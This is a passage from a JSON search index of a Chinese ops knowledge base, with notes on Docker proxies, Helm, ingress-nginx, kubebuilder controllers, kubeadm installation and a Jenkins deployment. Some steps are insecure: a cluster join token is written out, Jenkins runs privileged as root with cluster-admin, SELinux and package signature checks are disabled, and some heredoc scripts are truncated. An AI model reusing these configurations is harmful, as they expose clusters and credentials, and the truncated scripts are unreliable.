"},"K8S/Docker/容器网络代理.html":{"url":"K8S/Docker/容器网络代理.html","title":"容器网络代理","keywords":"","body":"分类 Docker代理一共分为3类 Docker代理： 控制docker pull等命令的代理container代理： docker run 启动容器的时候，容器里面使用的代理服务器builder代理： docker build时的代理 配置Docker代理 mkdir -p /etc/systemd/system/docker.service.d mkdir -p /etc/systemd/system/docker.service.d vim /etc/systemd/system/docker.service.d/proxy.conf # 写入以下内容 [Service] Environment=\"HTTP_PROXY=http://192.168.14.254:1080/\" Environment=\"HTTPS_PROXY=http://192.168.14.254:1080/\" Environment=\"NO_PROXY=localhost,127.0.0.1,.example.com\" # 重启 systemctl daemon-reload systemctl restart docker 配置container代理 vim ~/.docker/config.json { \"proxies\": { \"default\": { \"httpProxy\": \"http://192.168.14.254:1080/\", \"httpsProxy\": \"http://192.168.14.254:1080/\", \"noProxy\": \"localhost,127.0.0.1,.example.com\" } } } # 重启docker进程 build 代理 docker build . \\ --build-arg \"HTTP_PROXY=http://192.168.14.254:1080\" \\ --build-arg \"HTTPS_PROXY=http://192.168.14.254:1080\" \\ --build-arg \"NO_PROXY=localhost,127.0.0.1,.example.com\" \\ -t your/image:tag Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"K8S/Docker/常用镜像库.html":{"url":"K8S/Docker/常用镜像库.html","title":"常用镜像库","keywords":"","body":"个人定义代理仓库 gcro.io镜像代理站 gcr.io.itgod.org --> gcr.io例:docker pull gcr.io.itgod.org/google-containers/pause-amd64:3.1实际等同:docker pull gcr.io/google-containers/pause-amd64:3.1 阿里云的谷歌镜像仓库地址 registry.aliyuncs.com/google_containers docker.io (docker hub公共镜像库) gcr.io (Google container registry) k8s.gcr.io (等同于 gcr.io/google-containers) quay.io (Red Hat运营的镜像库) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-15 03:25:25 "},"K8S/helm/制作helm包.html":{"url":"K8S/helm/制作helm包.html","title":"制作helm包","keywords":"","body":"使用helm生成配置的脚手架 helm create test1 结果： 基于github做分发 mkdir docs helm package test1 -d docs/ cd docs/ && helm repo index . docs目录下的结构:将这个目录推送到github ,然后设置->pages中设置sources指向master分支，路径读取docs/ 客户端使用 helm repo add test1 https://.github.com/xxx helm repo update helm install test1 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"K8S/ingress/":{"url":"K8S/ingress/","title":"Ingress","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:14:29 "},"K8S/ingress/server-snippet.html":{"url":"K8S/ingress/server-snippet.html","title":"Server Snippet","keywords":"","body":"注解location nginx.ingress.kubernetes.io/server-snippet: | location ~* \"/7j5CiHAFWF.txt\" { return 200 \"7311110d02bd078c08be575456dddeda\"; } 跨域 kubectl.kubernetes.io/last-applied-configuration: | if ($request_method = 'OPTIONS') { add_header 'Access-Control-Max-Age' 1728008; add_header 'Access-Control-Allow-Origin' '*' always; add_header 'Access-Control-Allow-Headers' '*'; add_header 'Access-Control-Allow-Methods' 'GET,POST,PUT,DELETE,PATCH,OPTIONS'; return 200; } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:14:29 "},"K8S/ingressNginx/":{"url":"K8S/ingressNginx/","title":"Ingress Nginx","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"K8S/ingressNginx/ingress透传代理https请求.html":{"url":"K8S/ingressNginx/ingress透传代理https请求.html","title":"ingress透传代理https请求","keywords":"","body":"转发https流量到backend 默认情况下，ingress会终止https请求，通过backend代理到后端时，后端服务只会接收到http请求，通过这个注解可以申明透传https请求到后端 nginx.ingress.kubernetes.io/ssl-passthrough: \"true\" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:14:29 "},"K8S/ingressNginx/Nginx配置注入.html":{"url":"K8S/ingressNginx/Nginx配置注入.html","title":"Nginx配置注入","keywords":"","body":" 注入Nginx的Location 配置 apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: nginx.ingress.kubernetes.io/server-snippet: | location ~* \"/7j5CiHAFWF.txt\" { return 200 \"7311110d02bd078c08be575456dddeda\"; } ingress nginx controller 生成后的配置 # in ingress nginx controll bash-5.1$ cat nginx.conf | grep -C3 txt } # Custom code snippet configured for host single.zhetuitui.com location ~* \"/7j5CiHAFWF.txt\" { return 200 \"7311110d02bd078c08be575456dddeda\"; } 注入Lua脚本(做钉钉扫描鉴权示例) apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: nginx.ingress.kubernetes.io/force-ssl-redirect: \"false\" nginx.ingress.kubernetes.io/proxy-body-size: \"100m\" nginx.ingress.kubernetes.io/auth-url: \"http://auth-service.aaa.com/get-access-permission\" nginx.ingress.kubernetes.io/auth-signin: \"https://oapi.dingtalk.com/connect/qrconnect?appid=\" nginx.ingress.kubernetes.io/configuration-snippet: | set_by_lua_block $redirecturi { local origin_url = ngx.var.scheme .. \"://\" .. ngx.var.host .. ngx.var.uri local redirect_uri = \"http://auth-service.aaa.com/get-code?originUrl=\" .. origin_url return ngx.escape_uri(redirect_uri) } error_page 419 = @index_api; if ( $arg_r ~* \"^api\" ) { return 419; } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"K8S/kong/":{"url":"K8S/kong/","title":"Kong","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"K8S/kong/JWT+ACL.html":{"url":"K8S/kong/JWT+ACL.html","title":"JWT ACL","keywords":"","body":"JWT + ACL Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"K8S/二次开发/":{"url":"K8S/二次开发/","title":"二次开发","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"K8S/二次开发/client-go/":{"url":"K8S/二次开发/client-go/","title":"Client Go","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"K8S/二次开发/client-go/doc.html":{"url":"K8S/二次开发/client-go/doc.html","title":"Doc","keywords":"","body":"client类型 RESTclient: 最基础的客户端，提供最基础的封装 Clientset: 是client集合。包含所有的K8S内置资源 dynamicClient: 动态客户端，可以操作任意的K8S资源 Doscoveryclinet: 发现KS8提供的资源组，比如kubectl api-reousrces 就是使用了这个类型 核心组件 Reflector: list/watch api-serverDelta FIFO Queue: Reflector将list、atch数据加入队列Indexer/Cache: 缓存，数据会与Api server一致，缓解API Server压力，提供了GET/DELETE/LIST等方法存储pod对象。但是比如要获取某个Namespace下所有的POD，我们只能通过pod的对象再进行手动组装数据 Indexer可以通过indexers，indeces、index方法自动建立索引，来解决这个问题 sharedProcessor： WorkQueue： 通用队列、延迟队列、限速队列。通常直接使用限速队列 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"K8S/二次开发/client-go/pod内使用client-go操作集群.html":{"url":"K8S/二次开发/client-go/pod内使用client-go操作集群.html","title":"pod内使用client-go操作集群","keywords":"","body":"集群内控制器pod通过client-go操作集群 需要导入包 \"k8s.io/client-go/kubernetes\" \"k8s.io/client-go/rest\" 操作Deployment # 集群内控制器初始配置 config, err := rest.InClusterConfig() if err != nil { gres.Status = 401 return gres } clientset, err := kubernetes.NewForConfig(config) if err != nil { gres.Status = 571 return gres } # 获取Deployment的信息 dp, err := clientset.AppsV1().Deployments(data.SelectedImage.Namespace).Get(context.TODO(), data.DpName, metav1.GetOptions{}) # 更新资源 _, err = clientset.AppsV1().Deployments(data.SelectedImage.Namespace).Update(context.TODO(), dp, metav1.UpdateOptions{}) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"K8S/二次开发/kubebuilder/":{"url":"K8S/二次开发/kubebuilder/","title":"Kubebuilder","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"K8S/二次开发/kubebuilder/Reconcile提取其他资源.html":{"url":"K8S/二次开发/kubebuilder/Reconcile提取其他资源.html","title":"Reconcile提取其他资源","keywords":"","body":"admisstion webhook 获取huise名称空间下的所有deployment(client.InNamespace可以不指定) func (r *SnapshotReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) { log2 := log.FromContext(ctx) var dp appsv1.DeploymentList if err := r.Client.List(ctx, &dp, client.InNamespace(\"huise\")); err != nil { log2.Error(err, \"unable fetch dp\") } for _, v := range dp.Items { log2.Info(fmt.Sprintf(\"%s -- %s \\n\", v.Name, v.Namespace)) } eturn ctrl.Result{}, nil } 设置Annotations 为指定的资源设置Annotations，这简单且非常有用，比如控制器操作完资源后，应该添加一个Annotations，用于注释这个资源 已经被操作过了，避免控制器重复操作。 sp.SetAnnotations(map[string]string{\"Snapshot\": \"true\"}) 判断指定的资源是否存在 设置查询结构dpname，将查询结果绑定到dp var dp appsv1.Deployment for _, v := range res { log2.Info(fmt.Sprintf(\"%s -- %s=%s\", v.DpName, v.ContainerName, v.ContainerImage)) dpname := types.NamespacedName{ Namespace: v.NameSpace, Name: v.DpName, } if err := r.Get(ctx, dpname, &dp); err != nil { return ctrl.Result{}, nil 资源绑定删除 比如开发的控制器创建了一个svc和一个ingress，我们可以通过setownerreference关联这两个资源， 在删除这个GVK的时候，我们的所有资源都会一并自动删除 controllerutil.SetOwnerReference方法 更新资源 # 为spr对象设置了一个annotations，并将这个对象传给Update方法进行集群更新 spr.SetAnnotations(map[string]string{\"Snapshot\": \"true\"}) if err := r.Update(ctx, &spr); err != nil { return ctrl.Result{}, err } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"K8S/二次开发/kubebuilder/开发环境准备工作.html":{"url":"K8S/二次开发/kubebuilder/开发环境准备工作.html","title":"开发环境准备工作","keywords":"","body":"项目demo 含基础控制器Snapshots 变异控制器，自动注入env，关联annotations创建资源等 SSL双向认证 配置代理 由于很多资源和镜像均在google云或则其他外网资源上，为了方面开发，建议直接配置Docker代理，和build代理 创建一个目录，执行kubebuilder初始化目录kubebuilder init --domain itgod.org --repo itgod.org/dtk 由kubebuilder生成一个GVK的框架kubebuilder create api --group dtkapps --version v1 --kind SnapshotRollback 开始开发 参考 https://book.kubebuilder.io/，方便快速创建项目 开发一个监听deployment Image变化的控制器示例 1、修改controllers/t1_controller.go中的econcile函数，在// TODO(user): your logic here下添加内容 func (r *T1Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) { _ = log.FromContext(ctx) // TODO(user): your logic here deployment := &appsv1.Deployment{} err := r.Get(ctx, req.NamespacedName, deployment) if err != nil { if errors.IsNotFound(err) { return reconcile.Result{}, nil } // Error reading the object - requeue the request. return reconcile.Result{}, err } // end return ctrl.Result{}, nil } 2、controllers/t1_controller.go中的SetupWitchManager函数修改为监听Deployment核心资源 func (r *T1Reconciler) SetupWithManager(mgr ctrl.Manager) error { return ctrl.NewControllerManagedBy(mgr). For(&appsv1.Deployment{}). Complete(r) } 3、make run运行 (依赖kubeconfig文件) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"K8S/二次开发/webhook证书颁发.html":{"url":"K8S/二次开发/webhook证书颁发.html","title":"webhook证书颁发","keywords":"","body":"istio 的证书颁发脚本 安装证书管理器 kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.10.0/cert-manager.yaml service名字必须跟controller的svc名字一致 原脚本链接： https://github.com/istio/istio/blob/release-0.7/install/kubernetes/webhook-create-signed-cert.sh #!/bin/bash set -e usage() { cat > ${tmpdir}/csr.conf [req] req_extensions = v3_req distinguished_name = req_distinguished_name [req_distinguished_name] [ v3_req ] basicConstraints = CA:FALSE keyUsage = nonRepudiation, digitalSignature, keyEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = ${service} DNS.2 = ${service}.${namespace} DNS.3 = ${service}.${namespace}.svc EOF openssl genrsa -out ${tmpdir}/server-key.pem 2048 openssl req -new -key ${tmpdir}/server-key.pem -subj \"/CN=${service}.${namespace}.svc\" -out ${tmpdir}/server.csr -config ${tmpdir}/csr.conf # clean-up any previously created CSR for our service. Ignore errors if not present. kubectl delete csr ${csrName} 2>/dev/null || true # create server cert/key CSR and send to k8s API cat &2 echo \"See https://istio.io/docs/setup/kubernetes/sidecar-injection.html for more details on troubleshooting.\" >&2 exit 1 fi echo ${serverCert} | openssl base64 -d -A -out ${tmpdir}/server-cert.pem # create the secret with CA cert and server cert/key kubectl create secret generic ${secret} \\ --from-file=key.pem=${tmpdir}/server-key.pem \\ --from-file=cert.pem=${tmpdir}/server-cert.pem \\ --dry-run -o yaml | kubectl -n ${namespace} apply -f - webhook 资源创建 替换 # 创建webhook资源 [root@localhost deployment]# cat mutatingwebhook-ca-bundle.yaml apiVersion: admissionregistration.k8s.io/v1beta1 kind: MutatingWebhookConfiguration metadata: name: mutating-webhook-example-cfg webhooks: - name: mutating-example.itgod.org clientConfig: service: name: dtk-controller-webhook-service namespace: dtk-system port: 9443 path: \"/mutate\" caBundle: ${CA_BUNDLE} rules: - operations: [\"CREATE\"] apiGroups: [\"\"] apiVersions: [\"*\"] resources: [\"pods\"] cabundle替换脚本（其实就是kubeconfig文件中的ca） #!/bin/bash ROOT=$(cd $(dirname $0)/../../; pwd) set -o errexit set -o nounset set -o pipefail export CA_BUNDLE=$(kubectl config view --raw -o json | jq -r '.clusters[0].cluster.\"certificate-authority-data\"' | tr -d '\"') if command -v envsubst >/dev/null 2>&1; then envsubst else sed -e \"s|\\${CA_BUNDLE}|${CA_BUNDLE}|g\" fi Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-11-25 05:11:56 "},"K8S/二次开发/基础概念.html":{"url":"K8S/二次开发/基础概念.html","title":"基础概念","keywords":"","body":"CRD CRD的作用只是在K8S里注册资源类型，使K8S可以识别我们自定义的资源类型，简称GVK(每个资源类型都有group-version-kind对应)，比如在YAML中经常申明的类型 KIND: Deployment 比如下面命令列出的的Deployment就是一个K8S的资源类型，对应的GVK关系是 Group: apps Version: v1 Kind: Deployment [root@jumpserver ~]# kubectl api-resources NAME SHORTNAMES APIGROUP NAMESPACED KIND deployments deploy apps true Deployment .... CRD的作用非常有限，只是将自定义资源类型注册到了K8S中。可以使用kubect api-resources查看。 比如此处我们注册了一个资源类型, group是dtkapps,v是v1，kind是snapshot。这个时候我们通过yaml创建KINS: snapshot的资源时，可以正常创建。但是不会有实际动作(比如创建pod)，我们想要实现自定的动作，需要再编写controller来实现自定义逻辑 [root@jumpserver ~]# kubectl api-resources | grep -i snapshot snapshotrollbacks dtkapps.itgod.org true SnapshotRollback snapshots dtkapps.itgod.org true Snapshot 控制器 三种自定义控制器类型 基础控制器 一般用于监听GVK的变化，再异步进行一些额外的逻辑操作（并不能干预原始请求） 应用场景: 比如希望Deployment变化的时候，将Deployment的image记录到数据库中， 或则自动创建一个svc关联这个deployment中的pod 变异控制器 可以干扰请求，对请求进行修改。 应用场景: 比如我希望Pod在被创建或者更新的时候，在pod里面自动加入一个env变量 准入控制器 可以决定这个请求是否被执行 应用场景: 比如我希望pod在被创建的时候，比如包含某个env变量。如果不包含则拒绝创建 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"K8S/全链路灰度发布/":{"url":"K8S/全链路灰度发布/","title":"全链路灰度发布","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:55:28 "},"K8S/全链路灰度发布/1、发布类型.html":{"url":"K8S/全链路灰度发布/1、发布类型.html","title":"1、发布类型","keywords":"","body":"常用的发布类型 滚动发布 原理：假设A服务的v1版本部署了10个节点，轮询将这10个节点升级到v2版本 优点: 易实现且节约资源 缺陷：在发布期间，用户的请求可能会路由到v2版本处理，也可能会路由到v1版本处理;当版本涉及数据库等、接口字段类型等变更时将会造成客户端不可预知的错误 且回滚困难 蓝绿发布 原理： 假设A服务的V1版本部署了10个节点，需要发布v2版本时，先将v2版本也不熟10个节点，然后再统一将v1版本的所有流量路由到v2版本。蓝色发布很多时候配合流量比例使用 优点： 易实现，而且可以快速切换、回滚。提高发版速度 缺陷: 需要两倍的资源 按流量比例发布 原理：比如基于hash、会话、随机等策略使70%的流量到达v1版本，30%的流量到达v2版本 缺陷： 灰度发布(又名金丝雀发布) 原理： 通过流量随机百分比、header头、URI参数等用户属性的方式将流量平滑的在A/B版本上过渡，可以进行A/B 测试，让一部分用户使用灰度版本并逐渐放大流量 微服务全链路灰度发布系统带来的挑战 原理跟灰度发布原理一致，但是要针对整条链路实现链路灰度，比如A->B->C->D的服务调用管理中，变成A->B2->C2->D关系，有灰度版本时走灰度版本，无灰度版本的应用走正常版本 这个流量转发过程变得非常复杂 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:55:28 "},"K8S/全链路灰度发布/2、全链路灰度发布.html":{"url":"K8S/全链路灰度发布/2、全链路灰度发布.html","title":"2、全链路灰度发布","keywords":"","body":"全链路灰度发布实现 必须解决的场景问题 背景： 1、放问itgod.org域名时，走正常线上版本提供服务 2、当User-Agnet中包含ToGray时，走灰度版本系统服务 3、假设有4个服务分别为A/B/C/D，正常调用关系是A->B->C->D 4、应用B推出了B2版本，应用D推出了D2版本，需要进行灰度发布，并进行测试 问题1： 流量标识怎么透传 用户请求中带了User-Agent: ToGray，并成功抵达了A服务，A服务在调用B服务时，B服务此时有B和B2两个版本， 应该将来自A的请求转发到B还是B2？ 问题2： 识别了流量标识怎么路由 1、流量中包含测试流量的特殊标识，但是下一个目标应用并没有灰度环境时如何路由?比如A->B时，带上了特殊流量标识，而B没有B2版本，怎么定向到B版本 2、应用之间的调用是通过域名的方式调用，在调用域名时，可能会进行URI rewrite等处理，而不是直接调用另外一个服务，如何控制路由？ 问题3： 怎么闭环 当所有流量都已经转发到灰度版本后，此时称为灰度完成。那么灰度版本替代了原来的正常版本，下次还要继续发布灰度版本时怎么办？ 问题4： 怎么自动化 整个过程包含一下4个大阶段, 整个过程复杂，且人工干预场景较多，如何自动化灰度流量? 灰度环境准备： 准备应用的灰度版本，无流量路由进入 灰度测试流量： 一般根据设置固定的Header或则URI参数来路由 灰度用户级流量： 根据用户属性或随机 进行百分比流量操控自动化 灰度完成： 灰度版本彻底变更为线上版本，回收老版本，将此版本做为下一次灰度的老版本使用 问题5: 怎么为更复杂的多版本定制流控 如何支持更多的灰度版本？比如在灰度测试流量时，B服务同时有B2和B3多个版本 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"K8S/1、安装K8S.html":{"url":"K8S/1、安装K8S.html","title":"1、安装K8S","keywords":"","body":"阿里云的谷歌镜像仓库地址 registry.aliyuncs.com/google_containers 系统初始化： 设置主机名 hostnamectl set-hostname k8s-master001 mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/Cent* /etc/yum.repos.d/bak/ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 安装依赖包 yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wgetvimnet-tools git swapoff -a && sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab setenforce 0 && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config cat > kubernetes.conf /etc/systemd/journald.conf.d/99-prophet.conf kubeadm 部署 docker 安装 yum install -y yum-utils device-mapper-persistent-data lvm2 ### 新增 Docker 仓库 yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo ## 安装 Docker CE. yum update && yum -y install docker-ce-18.06.2.ce ## 创建 /etc/docker 目录。 mkdir /etc/docker # 设置 daemon。 cat > /etc/docker/daemon.json 集群部署 cat /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF yum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes systemctl enable --now kubelet # 查看初始化默认配置 kubeadm config print init-defaults > kubeadm-config.yaml kubeadm init --kubernetes-version=v1.19.2 \\ --control-plane-endpoint=172.16.1.125:9443 \\ --upload-certs \\ --apiserver-advertise-address=0.0.0.0 \\ --image-repository registry.aliyuncs.com/google_containers \\ --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16 | tee kubeadm-init.log 节点加入集群 # 根据输出的提示信息，执行下面的命令 mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config # 根据提示执行指定的命令 加入为master节点 或者 普通node节点 kubeadm join 172.16.5.30:6443 --token hjqed5.0ueiyniog0pzls6p \\ --discovery-token-ca-cert-hash sha256:c54d339dad7b57d7e1a2e9b5a0aded876b16a4e1eae4be1848f4d38864e804fa # 此时通过kubectl get node 状态是notready，需要安装网络插件 flannel kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 取消污点，允许master部署pod kubectl taint nodes --all node-role.kubernetes.io/master- 禁止master部署pod kubectl taint nodes k8s node-role.kubernetes.io/master=true:NoSchedule kubectl taint nodes k8s kubernetes.io/hostname=k8s-master001 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/10、容器抓包.html":{"url":"K8S/10、容器抓包.html","title":"10、容器抓包","keywords":"","body":"tcpdump抓包 1、判断容器运行在哪个节点上 `kubctl describe pod -n mservice` 2、 登陆节点获取容器的network namespace（主机上使用netstat是看不到容器的tcp链接情况的，需要进入namespace） ```docker inspect -f nsenter --target -n``` 3、直接使用tcpdump抓包 tcpdump -i eth0 -w a.cap sniff插件抓包 kubectl -n test sniff website-7d7d96cdbf-6v4p6 sniff抓包时，比如要用特权模式启动，如果不是特权模式的容器，可以加参数-p解决，-p会在宿主机上重新启动一个容器，然后attach到目标pod的netns里指定tcpdump抓包 kubectl -n test sniff website-7d7d96cdbf-6v4p6 -o test.cap -p Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"K8S/Docker术语&原理.html":{"url":"K8S/Docker术语&原理.html","title":"Docker术语&原理","keywords":"","body":"Container 容器本质上是指受到资源限制、彼此之间相互隔离的若干个进程集合。Cgroup实现资源限制，Namespace实现隔离 Container Runtime 容器运行时是K8S最核心的组件，它将管理容器的整个生命周期, Podman/Docker/Containerd/CRI-O都是容器运行时 CRI (Container Runtime Interface) CRI 是K8S与Container交互的接口，用于Kubernetes和特定的容器实现解耦。由于Docker比K8s更早，所以有Dockershim，后续ContainerD和CRI-O就实现了CRI接口，不需要再使用Dockershim OCI 可以看做是Container Runtime的一个标准,用于运行根据 Open Container Initiative (OCI) 格式打包的应用程序，准确来说是runtime spec Runc runc是一个 CLI 工具，用于根据 OCI 规范在 Linux 上生成和运行容器。 CRI-O 根据OCI开发的一个容器运行时，仅为Kubernetes所用 使用Docker时的容器创建流程 API Server通过grpc发送请求到kubelet，kubelet内置了docker的shim，解析请求后转发到Docker，Docker再转发到Containerd，Containerd再创建Container-shim进程，最后通过runc与Linux 名称空间和资源限制交互，实现容器创建可以看到整套流程非常复杂，kubelet完全可以直接跟containerd交互，以此来简化流程提高性能 为什么有这么复杂的流程？K8S定制了OCI规范，要求所有的容器运行时都遵循这个规范，只要你的运行时支持这个规范，就可以直接接入K8S。但是再推出这个规范前，Docker的地位非常高，所有有一些运行时不会自身去实现CRI接口。所以kubelet里内置了docker-shim来支持OCI规范，而后来Docker又独立了containerd，因此调用逻辑复杂 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-10-10 23:37:31 "},"K8S/runc测试.html":{"url":"K8S/runc测试.html","title":"runc测试","keywords":"","body":"编译 runc不提供二进制包，需要克隆仓库自己编译(依赖go环境) runc仓库地址： https://github.com/opencontainers/runc.git git clone --depth 1 https://github.com/opencontainers/runc.git cd runc make sudo make install 创建OCI bundle # create the top most bundle directory mkdir /mycontainer cd /mycontainer # create the rootfs directory mkdir rootfs # 根据busybox生成config.json docker export $(docker create busybox) | tar -C rootfs -xvf - 运行容器 runc run mycontainerid 比如内存控制，实际上是通过/sys/fs/cgroup/memory/容器名称/limit文件限制内存使用 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-10-10 23:37:31 "},"K8S/动态pv.html":{"url":"K8S/动态pv.html","title":"动态pv","keywords":"","body":"helm install stable/nfs-client-provisioner --set nfs.server=19fb4b48551-qxp55.cn-chengdu.nas.aliyuncs.com --set nfs.path=/dynamic_sc --name nfs-client-provisioner 设置为默认的storageclass kubectl patch storageclass nfs-client -p '{\"metadata\": {\"annotations\":{\"storageclass.kubernetes.io/is-default-class\":\"true\"}}}' kubectl get sc Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/安装Helm.html":{"url":"K8S/安装Helm.html","title":"安装Helm","keywords":"","body":"helm 安装 github 下载helm安装包 wget https://get.helm.sh/helm-v2.16.11-linux-amd64.tar.gz tar xf helm-v2.16.11-linux-amd64.tar.gz # 解压后直接把helm 复制到/usr/local/bin目录中 cp linux-amd64/helm /usr/local/bin/ # 可以查看helm版本，现在会提示无法连接到服务器tiller，因为还没有部署tiller helm version 安装tiller helm init --upgrade --tiller-image cnych/tiller:v2.14.1 安装完成后默认会在kube-system下运行一个tiller-deploy的容器 再运行helm version 查看helm 和 tiller的版本信息 为tiller创建rbac授权 cat > helm-rbrc.yml 从阿里云镜像仓库部署tiller容器 helm init --service-account=tiller --tiller-image=registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.16.1 --history-max 300 # 再次执行helm version 查看版本 helm version helm list 如果需要卸载tiller执行以下命令 kubectl get -n kube-system secrets,sa,clusterrolebinding -o name|grep tiller|xargs kubectl -n kube-system delete kubectl get all -n kube-system -l app=helm -o name|xargs kubectl delete -n kube-system Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/安装jenkins.html":{"url":"K8S/安装jenkins.html","title":"安装jenkins","keywords":"","body":"pv-pvc.yml apiVersion: v1 kind: PersistentVolume metadata: name: jenkins spec: capacity: storage: 200Gi volumeMode: Filesystem accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain storageClassName: v1 nfs: path: / server: 19fb4b48551-qxp55.cn-chengdu.nas.aliyuncs.com mountOptions: - nfsvers=4.0 --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: jenkins spec: accessModes: - ReadWriteMany resources: requests: storage: 200Gi storageClassName: v1 volumeName: jenkins RBAC apiVersion: v1 kind: ServiceAccount metadata: name: jenkins-admin #ServiceAccount名 namespace: jenkins #指定namespace，一定要修改成你自己的namespace labels: name: jenkins --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: jenkins-admin labels: name: jenkins subjects: - kind: ServiceAccount name: jenkins-admin namespace: jenkins roleRef: kind: ClusterRole name: cluster-admin apiGroup: rbac.authorization.k8s.io deployment apiVersion: apps/v1 kind: Deployment metadata: name: jenkins namespace: jenkins spec: selector: matchLabels: app: jenkins replicas: 1 template: metadata: labels: app: jenkins spec: terminationGracePeriodSeconds: 10 serviceAccount: jenkins-admin containers: - name: jenkins image: jenkins/jenkins:lts imagePullPolicy: IfNotPresent securityContext: runAsUser: 0 #设置以ROOT用户运行容器 privileged: true #拥有特权 ports: - containerPort: 8080 name: web protocol: TCP - containerPort: 50000 name: agent protocol: TCP resources: limits: cpu: 1000m memory: 1Gi requests: cpu: 500m memory: 512Mi livenessProbe: httpGet: path: /login port: 8080 initialDelaySeconds: 60 timeoutSeconds: 5 failureThreshold: 12 readinessProbe: httpGet: path: /login port: 8080 initialDelaySeconds: 60 timeoutSeconds: 5 failureThreshold: 12 volumeMounts: - name: jenkinshome subPath: jenkins mountPath: /var/jenkins_home env: - name: LIMITS_MEMORY valueFrom: resourceFieldRef: resource: limits.memory divisor: 1Mi - name: JAVA_OPTS value: -Xmx$(LIMITS_MEMORY)m -XshowSettings:vm -Dhudson.slaves.NodeProvisioner.initialDelay=0 -Dhudson.slaves.NodeProvisioner.MARGIN=50 -Dhudson.slaves.NodeProvisioner.MARGIN0=0.85 -Duser.timezone=Asia/Shanghai securityContext: fsGroup: 1000 volumes: - name: jenkinshome persistentVolumeClaim: claimName: jenkins --- apiVersion: v1 kind: Service metadata: name: jenkins namespace: jenkins labels: app: jenkins spec: type: NodePort selector: app: jenkins ports: - name: web port: 8080 targetPort: web nodePort: 30000 - name: agent port: 50000 targetPort: agent 安装插件 因为网络原因需要将jenkins代理设置位置：http://jenkins访问url/pluginManager/advanced 将升级站点处的url地址修改为：http://mirror.xmission.com/jenkins/updates/current/update-center.json Kubernetes Cli Plugin：该插件可直接在Jenkins中使用kubernetes命令行进行操作。 Kubernetes plugin： 使用kubernetes则需要安装该插件 Kubernetes Continuous Deploy 